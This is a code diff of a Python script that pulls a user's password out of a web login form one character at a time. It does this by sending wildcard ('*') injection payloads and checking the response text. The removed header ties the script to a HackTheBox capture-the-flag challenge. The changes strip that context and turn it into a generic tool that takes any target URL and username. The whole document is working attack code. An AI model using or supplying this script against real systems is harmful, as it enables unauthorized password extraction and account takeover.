@@ -1,40 +1,35 @@
-# This tool is created for "Phonebook" in HackTheBox
-# https://app.hackthebox.com/challenges/phonebook
-
 import requests
 import argparse
 
-list = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
-    'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z',
-    '!', "'", '#', '$', '%', '&', "'", '(', ')', '+', ',', '-', '.', '/', ':', ';', '<', '=', '>', '?', '@', '[', ']', '^', '_', ',', '{', '}', '~', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0']
-
+# Define the list of characters to brute-force the password
+characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!\'#$%&()*+,-./:;<=>?@[\\]^_`{|}~'
 
 def send_request(url: str, username: str):
     data = {'username': username, 'password': ''}
     result = ''
 
-    flag = 1
-    while flag == 1:
-        flag = 0
-        for l in list:
-            data['password'] = result + l + '*'
-            r = requests.post(url, data=data)
+    while True:
+        found = False
+        for char in characters:
+            data['password'] = result + char + '*'
+            response = requests.post(url, data=data)
 
-            if 'No search results' in r.text:
-                result += l
-                flag = 1
+            # Check if the current character is correct
+            if 'No search results' in response.text:
+                result += char
+                found = True
                 print(result)
                 break
 
-if __name__ == '__main__':
-    parser = argparse.ArgumentParser()
+        # Exit loop if no characters are found, meaning password is complete
+        if not found:
+            break
 
-    parser.add_argument('url')
-    parser.add_argument('username')
+if __name__ == '__main__':
+    parser = argparse.ArgumentParser(description="Brute-force password using known characters.")
+
+    parser.add_argument('url', help="Target URL")
+    parser.add_argument('username', help="Username for login")
     args = parser.parse_args()
 
-    url = args.url
-    username = args.username
-
-    send_request(url, username)
-
+    send_request(args.url, args.username)
